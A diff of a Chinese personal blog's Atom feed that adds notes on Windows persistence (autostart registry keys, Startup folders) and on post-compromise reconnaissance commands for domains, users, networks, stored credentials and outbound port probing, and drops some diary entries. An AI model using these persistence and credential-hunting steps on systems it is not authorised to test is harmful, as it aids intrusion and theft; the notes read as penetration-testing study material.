title="基于注册表的自启动"></a>基于注册表的自启动</h3><p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 <code>Run</code> 和 <code>RunOnce</code> , 其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。</p><p>注册表如下：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></p><p>基于策略的自启动注册表设置如下：<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p><p>设置启动文件夹注册表位置如下：<br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code><br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code><br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></p><p>设置服务启动项注册表位置如下：<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></p><p>用户自启动位置<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 、 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> , 其中 <code>Userinit</code> 键允许指定用逗号分隔的多个程序。</p><p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：<br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></p><h3 id="基于特定目录的自启动"><a href="#基于特定目录的自启动" class="headerlink" title="基于特定目录的自启动"></a>基于特定目录的自启动</h3><p>自启动目录， <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 目录对特定用户生效， <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 对所有用户生效。在NT6以前，两个目录为 <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code> &#x2F; <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code> 。</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;进入内网后，要想办法保持权限。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="持久化" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8C%81%E4%B9%85%E5%8C%96/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之信息收集</title>
     <link href="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     <id>http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
     <published>2023-08-19T16:00:00.000Z</published>
-    <updated>2023-08-22T03:15:08.614Z</updated>
+    <updated>2023-08-25T07:50:34.972Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>主机名： <code>hostname</code><br>查询所有计算机名称 <code>dsquery computer</code><br>查看配置及补丁信息：<br><code>systeminfo</code><br><code>wmic qfe get description,installedOn /format:csv</code></p><p>查看版本： <code>ver</code></p><p>进程信息：<br><code>tasklist /svc</code><br><code>wmic process get caption,executablepath,commandline /format:csv</code><br><code>get-process</code></p><p>查看所有环境命令： <code>set</code></p><p>查看计划任务： <code>schtasks /QUERY /fo LIST /v</code></p><p>查看安装驱动： <code>DRIVERQUERY</code></p><p>查看操作系统信息：<br>架构： <code>wmic os get osarchitecture</code><br>系统名： <code>wmic os get caption</code></p><p>查看逻辑盘： <code>wmic logicaldisk get caption</code><br>查看安装的软件信息： <code>wmic product get name,version</code></p><p>查看服务信息：<br><code>wmic service list brief</code><br><code>sc query</code><br><code>Get-WmiObject win32_service | select PathName</code></p><h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><p>获取当前组的计算机名： <code>net view</code> (失败原因可能为防病毒程序或防火墙配置阻止与服务器的连接，禁用功能发现服务等。)<br>网络发现： <code>net view /all</code><br>查看所有域： <code>net view /domain</code><br>域信任信息： <code>nltest /domain_trusts</code><br>定位域控： <code>net time /domain</code><br>查看域中的用户名： <code>dsquery user</code><br>查询域组名称： <code>net group /domain</code><br>查询域管理员： <code>net group &quot;Domain Admins&quot; /domain</code></p><p>域控信息：<br><code>nltest /dclist:xx</code><br><code>Get-NetDomain</code><br><code>Get-NetDomainController</code><br><code>net group &quot;Domain controllers&quot;</code></p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>查看用户：<br><code>net user</code><br><code>woami</code> &#x2F; <code>whoami /priv</code> &#x2F; <code>whoami /all</code><br><code>wmic useraccount get /ALL /format:csv</code></p><p>用户特权信息： <code>whoami /priv</code><br>查看当前权限： <code>net localgroup administrators</code><br>查看在线用户： <code>quser</code> &#x2F; <code>qwinsta</code> &#x2F; <code>query user</code><br>查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域： <code>net config Workstation</code><br>ACL信息： <code>get-acl</code></p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>网卡信息： <code>ipconfig</code><br>ARP表： <code>arp -a</code><br>路由表： <code>route print</code><br>监听的端口： <code>netstat -ano</code><br>端口信息：<br><code>Get-NetTCPConnection</code><br>DNS缓存：<br><code>ipconfig /displaydns</code><br><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></p><p>探测出网情况：<br><code>powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) $_ &#125; 2&gt;$null&quot;</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>查看防火墙状态： <code>netsh advfireall show allprofiles</code><br>防火墙日志目录： <code>netsh firewall show logging</code><br>防火墙规则：<br><code>netsh advfirewall firewall show rule name=all</code><br><code>netsh firewall show config</code><br><code>netsh firewall show state</code></p><h2 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h2><p>Windows RDP连接记录<br>浏览器中保存的账号密码<br>系统密码管理器中的各种密码<br>无人值守安装文件中的密码信息：<br><code>C:\sysprep.inf</code><br><code>C:\sysprep\sysprep.xml</code><br><code>C:\Windows\Panther\Unattend\Unattended.xml</code><br><code>C:\Windows\Panther\Unattended.xml</code></p><h2 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h2><p><code>cmdkey /l</code><br>klist<br>msf meterpreter</p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><p>文档<br>xlsx &#x2F; xls<br>docx &#x2F; doc<br>pptx &#x2F; ppt<br>vsdx &#x2F; vsd<br>md &#x2F; txt</p><p>压缩文件<br>zip &#x2F; rar &#x2F; 7z</p><p>VPN配置<br>ovpn</p><p>代码<br>py &#x2F; php &#x2F; jsp &#x2F; aspx &#x2F; asp &#x2F; sql</p><p>配置文件<br>conf &#x2F; ini &#x2F; xml</p><p>特定关键字<br>账号 &#x2F; 账户 &#x2F; 登录 &#x2F; login &#x2F; user<br>密码 &#x2F; pass<br>代码 &#x2F; 文档 &#x2F; 交接 &#x2F; 备份 &#x2F; git &#x2F; svn<br>邮箱 &#x2F; 通讯录 &#x2F; 集群 &#x2F; 办公<br>代理 &#x2F; 内网 &#x2F; VPN<br>设备 &#x2F; 资产<br>系统 &#x2F; 运维 &#x2F; 拓扑 &#x2F; 网络 &#x2F; IT<br>后台 &#x2F; 管理员 &#x2F; 数据库<br>监控 &#x2F; 隔离 &#x2F; 防火墙 &#x2F; 网闸 &#x2F; 巡检</p><h2 id="局域网存活主机"><a href="#局域网存活主机" class="headerlink" title="局域网存活主机"></a>局域网存活主机</h2><p>NetBIOS扫描<br>OXID扫描</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>启用的共享文件夹<br>回收站<br>最近运行的命令<br>访问文件历史记录<br>查看补丁安装情况<br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p>日志与事件信息<br><code>wevtuil</code><br><code>eventvwr</code></p><p>注册表信息<br><code>reg</code></p><p>安装的各类agent监控软件<br>安装的杀毒软件<br>查看&#x2F;设置后缀失联<br><code>assoc</code><br><code>assoc .ext=example</code></p><p>PowerShell版本<br>.Net版本<br>Wi-Fi密码</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>主机名： <code>hostname</code><br>查询所有计算机名称 <code>dsquery computer</code><br>查看配置及补丁信息：<br><code>systeminfo</code><br><code>wmic qfe get description,installedOn /format:csv</code></p><p>查看版本： <code>ver</code></p><p>进程信息：<br><code>tasklist /svc</code><br><code>wmic process get caption,executablepath,commandline /format:csv</code><br><code>get-process</code></p><p>查看所有环境命令： <code>set</code></p><p>查看计划任务： <code>schtasks /QUERY /fo LIST /v</code></p><p>查看安装驱动： <code>DRIVERQUERY</code></p><p>查看操作系统信息：<br>架构： <code>wmic os get osarchitecture</code><br>系统名： <code>wmic os get caption</code></p><p>查看逻辑盘： <code>wmic logicaldisk get caption</code><br>查看安装的软件信息： <code>wmic product get name,version</code></p><p>查看服务信息：<br><code>wmic service list brief</code><br><code>sc query</code><br><code>Get-WmiObject win32_service | select PathName</code></p><h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><p>获取当前组的计算机名： <code>net view</code> (失败原因可能为防病毒程序或防火墙配置阻止与服务器的连接，禁用功能发现服务等。)<br>网络发现： <code>net view /all</code><br>查看所有域： <code>net view /domain</code><br>域信任信息： <code>nltest /domain_trusts</code><br>定位域控： <code>net time /domain</code><br>查看域中的用户名： <code>dsquery user</code><br>查询域组名称： <code>net group /domain</code><br>查询域管理员： <code>net group &quot;Domain Admins&quot; /domain</code></p><p>域控信息：<br><code>nltest /dclist:xx</code><br><code>Get-NetDomain</code><br><code>Get-NetDomainController</code><br><code>net group &quot;Domain controllers&quot;</code></p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>查看用户：<br><code>net user</code><br><code>woami</code> &#x2F; <code>whoami /priv</code> &#x2F; <code>whoami /all</code><br><code>wmic useraccount get /ALL /format:csv</code></p><p>用户特权信息： <code>whoami /priv</code><br>查看当前权限： <code>net localgroup administrators</code><br>查看在线用户： <code>quser</code> &#x2F; <code>qwinsta</code> &#x2F; <code>query user</code><br>查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域： <code>net config Workstation</code><br>ACL信息： <code>Get-ACL</code><br>查看用户SID：<br><code>whoami /user</code><br><code>wmic useraccount get name,sid</code></p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>网卡信息： <code>ipconfig</code><br>ARP表： <code>arp -a</code><br>路由表： <code>route print</code><br>监听的端口： <code>netstat -ano</code><br>端口信息：<br><code>Get-NetTCPConnection</code><br>DNS缓存：<br><code>ipconfig /displaydns</code><br><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></p><p>探测出网情况：<br><code>powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) $_ &#125; 2&gt;$null&quot;</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>查看防火墙状态： <code>netsh advfireall show allprofiles</code><br>防火墙日志目录： <code>netsh firewall show logging</code><br>防火墙规则：<br><code>netsh advfirewall firewall show rule name=all</code><br><code>netsh firewall show config</code><br><code>netsh firewall show state</code></p><h2 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h2><p>Windows RDP连接记录<br>浏览器中保存的账号密码<br>系统密码管理器中的各种密码<br>无人值守安装文件中的密码信息：<br><code>C:\sysprep.inf</code><br><code>C:\sysprep\sysprep.xml</code><br><code>C:\Windows\Panther\Unattend\Unattended.xml</code><br><code>C:\Windows\Panther\Unattended.xml</code></p><h2 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h2><p><code>cmdkey /l</code><br>klist<br>msf meterpreter</p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><p>文档<br>xlsx &#x2F; xls<br>docx &#x2F; doc<br>pptx &#x2F; ppt<br>vsdx &#x2F; vsd<br>md &#x2F; txt</p><p>压缩文件<br>zip &#x2F; rar &#x2F; 7z</p><p>VPN配置<br>ovpn</p><p>代码<br>py &#x2F; php &#x2F; jsp &#x2F; aspx &#x2F; asp &#x2F; sql</p><p>配置文件<br>conf &#x2F; ini &#x2F; xml</p><p>特定关键字<br>账号 &#x2F; 账户 &#x2F; 登录 &#x2F; login &#x2F; user<br>密码 &#x2F; pass<br>代码 &#x2F; 文档 &#x2F; 交接 &#x2F; 备份 &#x2F; git &#x2F; svn<br>邮箱 &#x2F; 通讯录 &#x2F; 集群 &#x2F; 办公<br>代理 &#x2F; 内网 &#x2F; VPN<br>设备 &#x2F; 资产<br>系统 &#x2F; 运维 &#x2F; 拓扑 &#x2F; 网络 &#x2F; IT<br>后台 &#x2F; 管理员 &#x2F; 数据库<br>监控 &#x2F; 隔离 &#x2F; 防火墙 &#x2F; 网闸 &#x2F; 巡检</p><h2 id="局域网存活主机"><a href="#局域网存活主机" class="headerlink" title="局域网存活主机"></a>局域网存活主机</h2><p>NetBIOS扫描<br>OXID扫描</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>启用的共享文件夹<br>回收站<br>最近运行的命令<br>访问文件历史记录<br>查看补丁安装情况<br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p>日志与事件信息<br><code>wevtuil</code><br><code>eventvwr</code></p><p>注册表信息<br><code>reg</code></p><p>安装的各类agent监控软件<br>安装的杀毒软件<br>查看&#x2F;设置后缀失联<br><code>assoc</code><br><code>assoc .ext=example</code></p><p>PowerShell版本<br>.Net版本<br>Wi-Fi密码</p>]]></content>
     
     
     <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。&lt;/p&gt;</summary>
@@ -31,6 +192,8 @@
     
     
     <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="信息收集" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     
     
     <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
@@ -301,167 +464,6 @@
     
     
     <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;无波澜。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>波西米亚狂想曲</title>
-    <link href="http://example.com/2023/07/29/Diary_20230729/"/>
-    <id>http://example.com/2023/07/29/Diary_20230729/</id>
-    <published>2023-07-28T16:00:00.000Z</published>
-    <updated>2023-07-29T16:08:04.530Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每次贴一张图片虽然是惯例，贴多了也有点懒得做了。</p><span id="more"></span><h1 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h1><p>今天看了波西米亚狂想曲，其实我早已听说过这部电影，当年上映的时候就在犹豫要不要去看，最终懒惰战胜了行动。<br>Netflix这一点很不错，把一部电影或剧集的精彩片段切一分钟左右出来。我就是因为看了电影里演唱会的精彩片段才决定去看的。<br>很不错，这是一部传记电影。是演的，可演唱会依然很打动人心，让我赞不绝口。<br>尤其是最后，当主角(弗雷迪·莫库里)知道自己得了艾滋并且只告诉了乐队成员之后，在台上唱出的歌和主角自身实在太契合。让人不禁怀疑冥冥之中天注定的感觉。</p><p>总的来说，我挺满意的。主角一帆风顺狂气的过了一阵子，又因小人毁了生活，最后的时间明悟了一切，回归了他们最好的Queen。故事结构很简单，依然挡不住好看，没有拯救谁没有谴责谁，只不过是过着如狂想曲般节奏的生活。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;每次贴一张图片虽然是惯例，贴多了也有点懒得做了。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一击</title>
-    <link href="http://example.com/2023/07/28/Diary_20230728/"/>
-    <id>http://example.com/2023/07/28/Diary_20230728/</id>
-    <published>2023-07-27T16:00:00.000Z</published>
-    <updated>2023-07-28T16:55:20.799Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/15.jpg" alt="秋"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>体验与猜测是两回事。</p><h1 id="笔记本"><a href="#笔记本" class="headerlink" title="笔记本"></a>笔记本</h1><p>今天拆开了自己的笔记本，为了清理灰尘和加装固态硬盘。</p><p>过程中其实没什么感觉，只想着要完成。结果都忘了拍照记录一下里面的样子了。<br>拆开后里面确实很多灰尘积聚，让人难以理解那么大一团是怎么堆在一起的。</p><p>打开后盖后，首先拔电源，太难拔了，不像别人视频里那么轻松，因为周围都是芯片，让我不能粗暴行事。<br>下一步则是拆散热器，拆这个的麻烦在于，不像后盖每个螺丝都按顺序排布，而是东一颗西一颗。整的我每次以为可以打开了又突然发现还有一颗。<br>拆开散热器之后便是清理了。散热器和风扇都非常脏，我直接把风扇用水冲洗再吹干了。散热器好像不能沾水所以我只能用刷子干刷，虽然没那么干净，至少把灰尘堵塞的地方给处理了。一切清理干净之后，将散热器归回原位之前，还需要涂硅脂。所幸赠送的小工具还算齐全，涂满了。<br>还有一个重头戏便是加装硬盘，塞进去即可，很轻松。<br>最后便是将后盖盖上，检验成效了。</p><p>刚开机的时候，一直显示不出Windows界面，我差点以为出事了，幸好等了一分钟后一切都回来了。<br>硬盘顺利显示出来，买的1T显示出来有930GB。本想通过这样扩容C盘，结果因为不是同一个区块，无法扩容。<br>之后又想着把以前的D盘空间分给C盘，结果也不行。原因是C盘与D盘并未相邻。<br>折腾了一通，还下了所谓口碑不错的某个分区助手。结果一点儿用没有。<br>最终我放弃了，选择清理C盘，增加了30GB之后就懒得折腾了。</p><p>用了一段时间，GPU温度42℃，还不错，比以前少了30℃左右。而且风扇也几乎不会转，没声音了。</p><p>总计花费2个半小时。还是挺久，第一次谨慎些也正常。虽然这次成功了，我也不想再清理。等哪时候散热感觉又不行了再说吧。</p><p>我去，本来在写日记的时候没问题，写着写着电脑蓝屏了，多半是我今天下午折腾导致的，突然想起来今天扭歪了散热器，好多地方还留下划痕，不知道是不是其中的某些原因。烦内，希望别再遇到了吧。</p><h1 id="王国"><a href="#王国" class="headerlink" title="王国"></a>王国</h1><p>今天看完了一部丧尸片的S1，王国。<br>这部是Netflix投资的韩国片，算是口碑最好的那几个了。一季有6集，每集50分钟左右。从总时长来说，和日漫差不多。<br>古代丧尸片，节奏稍微慢热。确实各方面都不错，制作上找不到挑剔的地方，情景也蛮逼真的（比如掉脑袋之类的）。看惯了日漫反而挺不习惯的。<br>犹豫要不要把S2看了…</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/15.jpg&quot; alt=&quot;秋&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>无事</title>
-    <link href="http://example.com/2023/07/27/Diary_20230727/"/>
-    <id>http://example.com/2023/07/27/Diary_20230727/</id>
-    <published>2023-07-26T16:00:00.000Z</published>
-    <updated>2023-07-28T08:08:55.594Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/14.jpg" alt="summer"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如此。</p><h1 id="Netflix"><a href="#Netflix" class="headerlink" title="Netflix"></a>Netflix</h1><p>今天在合租群买了一个便宜的Netflix，9元一月。</p><p>回顾起来自己一路上使用奈飞的过程。最初听说有这么一个全球最好的流媒体平台，想着试一试。<br>于是用PayPal付款，但由于网络状况，我多付了保证金，导致我那一次好像是花了400元左右才一个月。而这个是可以5人共用的，只有我一人用。想想还是挺亏的。为了不那么亏，后来随便找了个群问了问有没有人合租，找着一个，好像是让对方付了15给我。结果不知怎的，对方把付费方案给我取消了，我也就看不了了，问了他最后也说不出什么东西。</p><p>第二次，是在看到一个广告说卖合租奈飞，我看了下还挺便宜的，15元一月。再往后涨了一点，成了18元一月。我也接受了。<br>这次是我用的最久的一次，好长时间都在用。</p><p>第三次，也即这次。契机是我看了第二次合租的地区是巴基斯坦，最高级方案换算成人民币总共才27元。可5人用。也即每人平均6元。<br>本想之前的到期了自己开个巴基斯坦的，但是我担心找不着4个人，也是有些犹豫。<br>最后在合租群看有人开这个，我想了想也还能接受，于是加入了。</p><p>如果还有下一次的话，我想就是自己开Netflix了吧。</p><h1 id="成本"><a href="#成本" class="headerlink" title="成本"></a>成本</h1><p>回顾三次开Netflix逐步降低成本的过程，其实也蛮有趣的。<br>第一次通过正规途径，当冤大头。<br>第二次通过专业中间商，走一般的路。<br>第三次通过民间合租，走更便宜的路。</p><p>价格不同的根本原因在于低价区的存在和经手的中间商。</p><h1 id="低价区"><a href="#低价区" class="headerlink" title="低价区"></a>低价区</h1><p>跨区，以达到降低成本的目的。这也算支持正版吗？<br>steam，YouTube，Netflix等大平台很多都有低价区。低价区的目的主要就是由于经济差异，来让人们负担得起。<br>而跨区毫无疑问是违反了官方的政策，但最终也购买了官方的东西。我感觉其实还挺矛盾的。<br>假如一个游戏，本来应当付10元，最后只付了5元。算是正版行为还是盗版行为？<br>严格地说，这是不完全正确的行为，如果我们单论对错，无疑是错。<br>这个问题还是留到以后再说吧，今天不想了。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/14.jpg&quot; alt=&quot;summer&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>虚无</title>
-    <link href="http://example.com/2023/07/26/Diary_20230726/"/>
-    <id>http://example.com/2023/07/26/Diary_20230726/</id>
-    <published>2023-07-25T16:00:00.000Z</published>
-    <updated>2023-07-28T07:30:25.346Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/Sky1.png" alt="天空之城"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有无。</p><h1 id="电子礼炮"><a href="#电子礼炮" class="headerlink" title="电子礼炮"></a>电子礼炮</h1><p>某亲戚买了电子礼炮，让我过去帮忙搬一下。一大早便是倾盆大雨像是破口大骂的泼妇，随后转而喋喋不休。让我内心有些抗拒。<br>无奈约好，于是去了。<br>搬的电子礼炮挺重，听说有1000多斤，即使下面有滚轮也让几个人挺吃力。再加上雨天搬车上更是麻烦了。<br>弄好后随后开车到一个偏僻之地测试，像个导弹发射器一样，还真有那么回事儿。<br>过程中一点小毛病很快解决了，于是轰隆声不断，顺利测试完，又回去了。<br>就这样，也没什么。</p><h1 id="电视"><a href="#电视" class="headerlink" title="电视"></a>电视</h1><p>因为今天大半天都是在亲戚家，看电视没人用，就投屏了《千与千寻》，主要有些不太熟的人不好意思直接放些没看过的电影以免出现某些奇怪的情节，而且也不太好放那种更偏向个人兴趣的片，人多就会混乱，那必然不能全心投入观赏之中。所以不如放一部看过的算是合家欢的电影。这部电影有50GB大小，正好也拿来测试清晰度了。<br>大概是由于影片太大，每次回退10s都会卡顿。也算是emby的一个缺点了吧。亲戚家的一位小孩子对千与千寻倒是看得津津有味。</p><h1 id="动画片"><a href="#动画片" class="headerlink" title="动画片"></a>动画片</h1><p>下午回到亲戚家后，那位小孩正在看某国产动画片。<br>我才认识到，原来国产动画片能烂到那种程度。与上午播放的千与千寻相比，一个天上一个地下。<br>怎么个烂法儿呢？搞些恶心的正能量，网络用词和各种烂梗之类的都在用，说话一惊一乍的，剧情稀烂…太多了。<br>还好我生得早了点，不然天天看这些东西，人都会变傻子的。</p><h1 id="虚无"><a href="#虚无" class="headerlink" title="虚无"></a>虚无</h1><p>我得承认，我又开始陷入虚无状态了。今天坐亲戚的车，几个人在聊天，但他们说每几句话，我内心的想法都是负面或虚无的。感觉只要一说出这些想法，能立马把这一小片空间的氛围给破坏掉。所以我全程一句话没说。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Sky1.png&quot; alt=&quot;天空之城&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>i</title>
-    <link href="http://example.com/2023/07/25/Diary_20230725/"/>
-    <id>http://example.com/2023/07/25/Diary_20230725/</id>
-    <published>2023-07-24T16:00:00.000Z</published>
-    <updated>2023-07-25T14:00:13.039Z</updated>
-    
